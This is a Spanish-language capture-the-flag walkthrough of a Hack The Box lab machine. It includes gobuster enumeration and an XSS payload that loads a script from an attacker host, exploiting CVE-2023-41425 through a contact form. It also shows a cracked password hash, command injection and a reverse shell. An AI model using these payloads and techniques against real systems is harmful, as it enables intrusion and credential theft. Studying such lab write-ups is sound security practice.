Analizamos la web y vamos a buscar directorios
```bash
gobuster dir --url http://10.10.11.28/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
![[{2A5D0861-11E6-4F72-AF9B-75D69E516138}.png]]
vamos a seguir buscando dentro de estos, y vemos que dentro de `themes` esta `bike` con estos archivos
![[{F8F9964D-533A-423E-8C7F-E4CEF1B2B3E5}.png]]
dentro de version vemos esta version: `3.2.0`
![[{F749FF64-899A-469F-B4DB-07AEAF2C99D4}.png]]
y en `LICENSE` vemos el autor
![[{30B9C479-453E-4F60-BCEA-ABCA8D718C60}.png]]
ahora vamos a buscar archivos por extensiones tal que asi:
```bash
gobuster dir --url http://10.10.11.28/themes/bike -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -b 403,404 -x md,php,js
```
en el readme.md vemos el programa
![[{B4F03431-9D4A-4A32-AA0E-2FDA5C1CF771}.png]]
si investigamos vemos que tiene unn exploit https://github.com/insomnia-jacob/CVE-2023-41425, la web deberia tener una pagina de login tal que asi: `http://10.10.11.28/index.php?page=loginURL`

![[{B77E74D2-F691-40DE-8250-DEFBB1B6FEA3}.png]]

vamos a ver como podemos hacer el xss analizando el codigo del exploit, vemos que lo que hace es mandar est payload, el cual descarga un script almacenado en nuestro server llamadom  xss.js 
![[{65D491DD-DED8-4112-A902-0E46501F9549}.png]]
pero esa direccion debe almacenarse en algun lugar del server, es decir tenemos que meter este texto en algun formulario que se guarde en el server, y hay un sitio, el formulario de contact.php
![[{E9587CF5-C4CB-438A-ADA7-D2E78F8BFFBF}.png]]
Nos ponemos en escucha `sudo tcpdump -i tun0 icmp -n` y mandamos esta cadena `http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.222:8000/xss_ping_fetch.js"></script><form+action=" `

hay dos usuario insteresantes
![[{C656F934-1087-417A-809B-76990B1CAEC4}.png]]
vamos a revisar el servidor a ver si hay algo interesante, y tenemos una passwod en database.js
`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`
![[{015E80D8-4228-4AA5-B3AD-7274345ECAF3}.png]]
Vamos a listar archivos SUID
```bash
 find / -perm -4000 2> /dev/null | xargs ls -l
```
![[{B5ACF6FC-C06E-4CBB-BCFD-AD94C34768F1}.png]]vamos a buscar vulnerabilidades para esa version del binario
![[{27F567DD-281A-419B-831B-1FD3CDD9848F}.png]]
pero si intentamos pasarlo nos pone que no hay espacio en el disco, vamos a ver si podemos cambiar algun archivo para que contenta nuestro exploit `https://gist.githubusercontent.com/taviso/ecb70eb12d461dd85cba/raw/abd3a4cbedd0d9c16f406841586bccff67ee991a/CVE-2015-3202`, vamos a ver mas cosas, com ver los puertos abiertos
![[{80E5ED2F-5A88-4A89-A477-DD552F2B7FB6}.png]]
bueno vamos a descifrar la password (para ello tenemos que quitar `\` del hash)
![[Pasted image 20241026202123.png]]
pass: `mychemicalromance`
ahora entramos con ssh a ver que hay con uno de los usurios de antes, en este caso amay, ahora hacemos un portfowarding del puerto 8080 y vemos esto:

![[Pasted image 20241026203309.png]]
vamos a iniciar session con los creadenciales de `amay/mychemicalromance` y tenemos esto
![[{80DEEC15-74F3-4A04-A23F-3096BD11939F}.png]]
vamos a verlo desde [[burpsuite]]
![[{D15D6A70-8C27-4BC7-B026-7E1F51FB344E}.png]]
vemos que estaa usando algo como `cat` para leer los archivos, vamos a intentar inyectar comandos como un ping 
![[Pasted image 20241026210028.png]]
![[{7099030E-905D-4D7D-B0BE-3AE93544F852}.png]]
y si podemos![[{EEAE6BEE-E33D-4253-A894-D12C295CCF57}.png]]
tambien vale asi
![[Pasted image 20241026210209.png]]
podemos mandar una revershell asi:
![[Pasted image 20241026210900.png]]
![[{FC26BCA0-91A5-40B3-A197-61B6A2D01B50}.png]]
